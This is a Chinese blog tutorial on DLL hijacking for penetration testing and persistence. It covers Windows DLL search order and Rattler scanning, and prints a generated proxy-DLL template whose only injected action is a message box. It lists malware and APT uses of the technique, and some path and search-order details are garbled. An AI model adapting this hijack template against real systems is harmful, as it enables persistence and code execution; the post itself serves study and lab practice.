@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>DLL劫持原理与实践 | sh1yan&#39;blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="description" content="0x00 前言 DLL劫持算是一个老的漏洞，而且乌云漏洞库中也有很多的案例，只不过案例更多的只是验证一下，并没有教如何利用。至于为什么专门抓起来再学一遍了，唉，内网渗透需要。。。 0x01 什么是DLL 这里先摘抄一下百度百科的解释：  DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执">
+<meta name="keywords" content="DLL劫持">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DLL劫持原理与实践">
+<meta property="og:url" content="sh1yan.top/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 前言 DLL劫持算是一个老的漏洞，而且乌云漏洞库中也有很多的案例，只不过案例更多的只是验证一下，并没有教如何利用。至于为什么专门抓起来再学一遍了，唉，内网渗透需要。。。 0x01 什么是DLL 这里先摘抄一下百度百科的解释：  DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\8.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\1.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\10.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\2.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\11.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\3.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\4.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\5.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\12.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\13.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\14.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\7.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\15.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\16.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\17.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\6.png">
+<meta property="og:updated_time" content="2019-06-15T17:33:20.426Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DLL劫持原理与实践">
+<meta name="twitter:description" content="0x00 前言 DLL劫持算是一个老的漏洞，而且乌云漏洞库中也有很多的案例，只不过案例更多的只是验证一下，并没有教如何利用。至于为什么专门抓起来再学一遍了，唉，内网渗透需要。。。 0x01 什么是DLL 这里先摘抄一下百度百科的解释：  DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执">
+<meta name="twitter:image" content="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\8.png">
+  
+    <link rel="alternative" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/gossip">Gossip</a>
+        
+          <a class="main-nav-link" href="/yqlj">Links</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="sh1yan.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-The-Principle-and-Practice-of-DLL-Hijacking" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/" class="article-date">
+  <time datetime="2019-06-15T17:25:55.000Z" itemprop="datePublished">2019-06-16</time>
+</a>
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/漏洞研究/">漏洞研究</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DLL劫持原理与实践
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="sh1yan.top/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/"></div>
+    </li>
+  </ul>
+</div>
+
+      
+      
+        
+        <p><strong>0x00 前言</strong></p>
+<p>DLL劫持算是一个老的漏洞，而且乌云漏洞库中也有很多的案例，只不过案例更多的只是验证一下，并没有教如何利用。至于为什么专门抓起来再学一遍了，唉，内网渗透需要。。。</p>
+<p><strong>0x01 什么是DLL</strong></p>
+<p>这里先摘抄一下百度百科的解释：</p>
+<blockquote>
+<p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。</p>
+</blockquote>
+<p>还有一段，我觉得更好理解的。<br><a id="more"></a></p>
+<blockquote>
+<p>DLL 是一个包含可由多个程序同时使用的代码和数据的库。例如，在 Windows 操作系统中，Comdlg32 DLL 执行与对话框有关的常见函数。因此，每个程序都可以使用该 DLL 中包含的功能来实现“打开”对话框。这有助于促进代码重用和内存的有效使用。</p>
+</blockquote>
+<p><strong>0x02 动态链接库加载顺序</strong></p>
+<p>一、Windows XP SP2之前<br>    Windows查找DLL的目录以及对应的顺序：</p>
+<ol>
+<li>进程对应的应用程序所在目录；</li>
+<li>当前目录（Current Directory）；</li>
+<li>系统目录（通过 GetSystemDirectory 获取）；</li>
+<li>16位系统目录；</li>
+<li>Windows目录（通过 GetWindowsDirectory 获取）；</li>
+<li>PATH环境变量中的各个目录；</li>
+</ol>
+<p>例如：对于文件系统,如doc文档打开会被应用程序office打开，而office运行的时候会加载系统的一个dll文件，如果我们将用恶意的dll来替换系统的dll文件，就是将DLL和doc文档放在一起，运行的时候就会在当前目录中找到DLL，从而优先系统目录下的DLL而被执行。</p>
+<p>二、在winxdows xp sp2之后</p>
+<p>​    Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：</p>
+<p>​    默认注册表为：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode，其键值为1</p>
+<ol>
+<li>进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</li>
+<li>系统目录（即%windir%system32）；</li>
+<li>16位系统目录（即%windir%system）；</li>
+<li>Windows目录（即%windir%）；</li>
+<li>当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</li>
+<li>PATH环境变量中的各个目录；</li>
+</ol>
+<p>三、windows7以上</p>
+<p>系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：</p>
+<p>计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\8.png" alt></p>
+<p>那么最终Windows2003以上以及win7以上操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p>
+<ol>
+<li>进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</li>
+<li>系统目录（即%windir%system32）；</li>
+<li>16位系统目录（即%windir%system）；</li>
+<li>Windows目录（即%windir%）；</li>
+<li>当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</li>
+<li>PATH环境变量中的各个目录；</li>
+</ol>
+<p><strong>0x03 编写一个DLL</strong></p>
+<p>IDE：vs2017</p>
+<p>语言：C\C++</p>
+<blockquote>
+<p>DLL写法不止下面我用的这个写法，还有其它嵌套写法（别问我怎么知道的，为了这篇文章，我踩了N个坑  = =！）</p>
+</blockquote>
+<p>1、进入一个文件夹目录，鼠标右键，用 “在 Visual Studio 中打开（V）” ，打开。</p>
+<p>2、然后 文件→新建→项目→[已安装 &gt; Visual C++ &gt; Windows桌面]→动态链接库（DLL），生成一个cpp文件。</p>
+<p>这里我命名为 shiyan_dll</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\1.png" alt></p>
+<p>3、然后在源文件 shiyan_dll.cpp 中填入如下代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// shiyan_dll.cpp : 定义 DLL 应用程序的导出函数。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"shiyan_dll.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>4、在头文件那鼠标右键新建一个 shiyan_dl.h 头文件，填入如下代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LIB_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIB_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这种声明方式是强制用c语言方式进行修饰，且用C的默认约定__cdecl方式。</span></span><br><span class="line"><span class="comment">// 这种方式编译产生的DLL中有一个导出函数：add，不加任何修饰。</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="keyword">int</span> __declspec(dllexport)add(<span class="keyword">int</span> x, <span class="keyword">int</span> y);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<p>5、这个时候，点击   生成→生成解决方案  ，然后我们的DLL函数就好了。</p>
+<p>6、然后我们进入到 shiyan_dll\Debug 目录，即可看到我们生成好的dll文件。</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\10.png" alt></p>
+<p><strong>0x04 加载使用我们的DLL文件</strong></p>
+<p>IDE：vs2017</p>
+<p>语言：C\C++</p>
+<blockquote>
+<p>加载DLL写法不止下面我用的这个写法，还有其它嵌套写法，但是其它写法，能不能被劫持就又是另一回事了。</p>
+</blockquote>
+<p>1、进入一个文件夹目录，鼠标右键，用 “在 Visual Studio 中打开（V）” ，打开。</p>
+<p>2、然后 文件→新建→项目→[已安装 &gt; Visual C++ &gt; Windows桌面]→Windows 控制台应用程序，生成一个cpp文件。</p>
+<p>这里我命名为 shiyan_c++</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\2.png" alt></p>
+<p>3、然后我们填入以下代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// shiyan_c++.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(*lpAddFun)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>; <span class="comment">// 函数声明 lpAddFun是一个指向函数的指针，该函数有两个参数都是int类型，函数的返回值也是int类型</span></span><br><span class="line"><span class="comment">// int *function(int,int)表示函数的两个参数都是int类型，函数的返回值是指向Int类型的指针；</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE hDll; <span class="comment">// DLL句柄</span></span><br><span class="line">	lpAddFun addFun; <span class="comment">// 函数指针</span></span><br><span class="line">	<span class="comment">//TCHAR tzPath[MAX_PATH];</span></span><br><span class="line"></span><br><span class="line">	hDll = LoadLibraryW(<span class="string">L"shiyan_dll.dll"</span>);<span class="comment">// 如果不加L会报错 “LoadLibraryW”: 不能将参数 1 从“const char [16]”转换为“LPCWSTR”</span></span><br><span class="line">											<span class="comment">//与指向的类型无关；转换要求 reinterpret_cast、C 样式转换或函数样式转换</span></span><br><span class="line">	<span class="keyword">if</span> (hDll != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		addFun = (lpAddFun)GetProcAddress(hDll, <span class="string">"add"</span>);</span><br><span class="line">		<span class="keyword">if</span> (addFun != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> result = addFun(<span class="number">1300</span>, <span class="number">14</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, result);</span><br><span class="line">			<span class="comment">//GetSystemDirectory(tzPath,MAX_PATH); //得到系统目录……没用啊……这是谁写的程序</span></span><br><span class="line">		&#125;</span><br><span class="line">		FreeLibrary(hDll);</span><br><span class="line">	&#125;</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>4、然后把一开始在shiyan_dll 项目目录下的 targetver.h、stdafx.h、stdafx.cpp 三个文件复制到 shiyan_c++ 项目目录下。并且添加到相应的头文件和源文件分类下（不添加的话，会无法生成文件）。</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\11.png" alt></p>
+<p>5、因为vs2017的IDE的原因，会有个pch.cpp、pch.h，在实际运用中，我们是不需要的，所以需要去除掉。</p>
+<p>6、点击 项目→shiyan_c++属性→C\C++→预编译头→选择不适用预编译头，然后选择应用，确认。</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\3.png" alt></p>
+<p>7、这个时候，点击   生成→生成解决方案  ，然后我们的加载DLL函数的exe文件就好了。</p>
+<p>8、然后我们把刚才生成好的dll文件和exe文件放到同一个目录中，并执行exe就能看到效果。</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\4.png" alt></p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\5.png" alt></p>
+<p><strong>0x05 DLL劫持的作用</strong></p>
+<ol>
+<li>病毒传播</li>
+<li>盗号木马</li>
+<li>隐私信息收集</li>
+</ol>
+<p>当然对于APT爱好者来说，DLL劫持最大作用，其实是权限维持！</p>
+<p>水坑，钓鱼的话，也是可以利用的。</p>
+<p><strong>0x06 DLL劫持的原理</strong></p>
+<p>通过前面介绍，我们可以看出，程序加载一个DLL时，是除了注册表固定好的绝对位置后，还会按顺序目录进行查找，如果我们提前伪造一个DLL文件，并且放置在加载以前的目录中，提前加载我们的DLL，从而达到一个劫持的效果。</p>
+<p>当然除了提前劫持这个一说，如果权限可以的话，我可以直接重构这个DLL文件，直接覆盖，或者变相应用，毕竟我们的重点是权限维持。</p>
+<p><strong>0x07 查找可能存在劫持的DLL</strong></p>
+<p>1、一般来说，我们可以使用ProcessExplorer、ProcessMonitor，再结合者注册表KnownDLLs即可分析，可能存在DLL劫持的漏洞。</p>
+<p>ProcessExplorer：</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\12.png" alt></p>
+<p>ProcessMonitor：</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\13.png" alt></p>
+<p>2、当然，也存在懒的方法，比如使用 Rattler_x64.exe 这个工具。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">F:\提权工具包\8<span class="title">_</span>权限维持相关工具\<span class="title">rattler</span>&gt;<span class="title">Rattler_x64.exe</span> "<span class="title">D</span>:\<span class="title">Firefox</span>\<span class="title">firefox</span>\<span class="title">firefox.exe</span>" 1</span></span><br></pre></td></tr></table></figure>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\14.png" alt></p>
+<p>注：使用该工具，测试软件路径不能有中文。</p>
+<p><strong>0x08 本地测试DLL劫持</strong></p>
+<p>1、这里，我使用 DLLHi_jacker.py 这款工具。</p>
+<p>2、我们把上面使用的 shiyan_dll 文件，放到工具同目录中，然后执行下面的语句：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">F:\提权工具包\8<span class="title">_</span>权限维持相关工具\<span class="title">DLLHi_jacker</span>&gt;<span class="title">python2</span> <span class="title">DLLHi_jacker.py</span> <span class="title">F</span>:\提权工具包\8<span class="title">_</span>权限维持相关工具\<span class="title">DLLHi_jacker</span>\<span class="title">shiyan_dll.dll</span></span></span><br></pre></td></tr></table></figure>
+<p>3、然后就会在目录下生成 shiyan_dll.cpp 文件，内容如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Generate by DLLHijacker.py</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:add=_DLLHijacker_add,@1"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXTERNC extern <span class="meta-string">"C"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAKED __declspec(naked)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPORT __declspec(dllexport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALCPP EXPORT NAKED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALSTD EXTERNC EXPORT NAKED void __stdcall</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALCFAST EXTERNC EXPORT NAKED void __fastcall</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALCDECL EXTERNC NAKED void __cdecl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> DLLHijacker</span><br><span class="line">&#123;</span><br><span class="line">    HMODULE m_hModule = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD m_dwReturn[<span class="number">17</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> BOOL WINAPI <span class="title">Load</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        TCHAR tzPath[MAX_PATH];</span><br><span class="line">        lstrcpy(tzPath, TEXT(<span class="string">"shiyan_dll.dll"</span>));</span><br><span class="line">        m_hModule = LoadLibrary(tzPath);</span><br><span class="line">        <span class="keyword">if</span> (m_hModule == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        <span class="keyword">return</span> (m_hModule != <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> VOID WINAPI <span class="title">Free</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (m_hModule)</span><br><span class="line">            FreeLibrary(m_hModule);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">FARPROC WINAPI <span class="title">GetAddress</span><span class="params">(PCSTR pszProcName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        FARPROC fpAddress;</span><br><span class="line">        CHAR szProcName[<span class="number">16</span>];</span><br><span class="line">        fpAddress = GetProcAddress(m_hModule, pszProcName);</span><br><span class="line">        <span class="keyword">if</span> (fpAddress == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (HIWORD(pszProcName) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                wsprintf(szProcName, <span class="string">"%d"</span>, pszProcName);</span><br><span class="line">                pszProcName = szProcName;</span><br><span class="line">            &#125;</span><br><span class="line">            ExitProcess(<span class="number">-2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fpAddress;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> DLLHijacker;</span><br><span class="line"><span class="function">VOID <span class="title">Hijack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MessageBoxW(<span class="literal">NULL</span>, <span class="string">L"DLL Hijack! by DLLHijacker"</span>, <span class="string">L":)"</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">    &#123;</span><br><span class="line">        DisableThreadLibraryCalls(hModule);</span><br><span class="line">        <span class="keyword">if</span>(Load())</span><br><span class="line">            Hijack();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH)</span><br><span class="line">    &#123;</span><br><span class="line">        Free();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ALCDECL <span class="title">DLLHijacker_add</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        __asm POP m_dwReturn[<span class="number">0</span> * TYPE <span class="keyword">long</span>];</span><br><span class="line">    GetAddress(<span class="string">"add"</span>)();</span><br><span class="line">    __asm JMP m_dwReturn[<span class="number">0</span> * TYPE <span class="keyword">long</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>4、然后我们参照着 0x04 把上述代码，编译成新的dll，不过有四点需要注意。</p>
+<p>5、该cpp文件，头部添加  #include “stdafx.h” 。</p>
+<p>6、代码第22行，lstrcpy(tzPath, TEXT(“shiyan_dll.dll”)); 中，dll文件名，可以修改成其他的，这里我修改为 shiyan_dll_ys.dll</p>
+<p>7、删除vs2017在创建项目时，自动创建的dllmain.cpp，因为我们上述代码中，已经生成了该部分的引用。</p>
+<p>8、点击项目→配置属性→常规→字符集→设置成    使用多字节字符集</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\7.png" alt></p>
+<p>9、然后点击生成dll文件即可。</p>
+<p>10、然后把生成的dll文件放置到shiyan_c++的Debug目录下，并且把我们利用工具生成的dll改名为shiyan_dll.dll，把正确的dll文件改名为shiyan_dll_ys.dll。</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\15.png" alt></p>
+<p>11、这时，我们双击 shiyan_c++.exe 文件。</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\16.png" alt></p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\17.png" alt></p>
+<p>12、可以看到，成功劫持，并且劫持成功了，还继续执行了原本的函数内容（我这个中间有个小报错，选择忽略即可，毕竟C++代码没学多久，水平还待提高）。</p>
+<p><strong>0x09 其它DLL玩法</strong></p>
+<p>这个玩法还是前几天看到的，但是，我本地是测试失败（各种环境测试，是各种，唉，太菜了），不过，人家记录的是成功的，搞不懂、搞不懂、</p>
+<p>文章地址1：<a href="https://mp.weixin.qq.com/s/7S1TqPgi_mPBVxpYyHt2yQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/7S1TqPgi_mPBVxpYyHt2yQ</a></p>
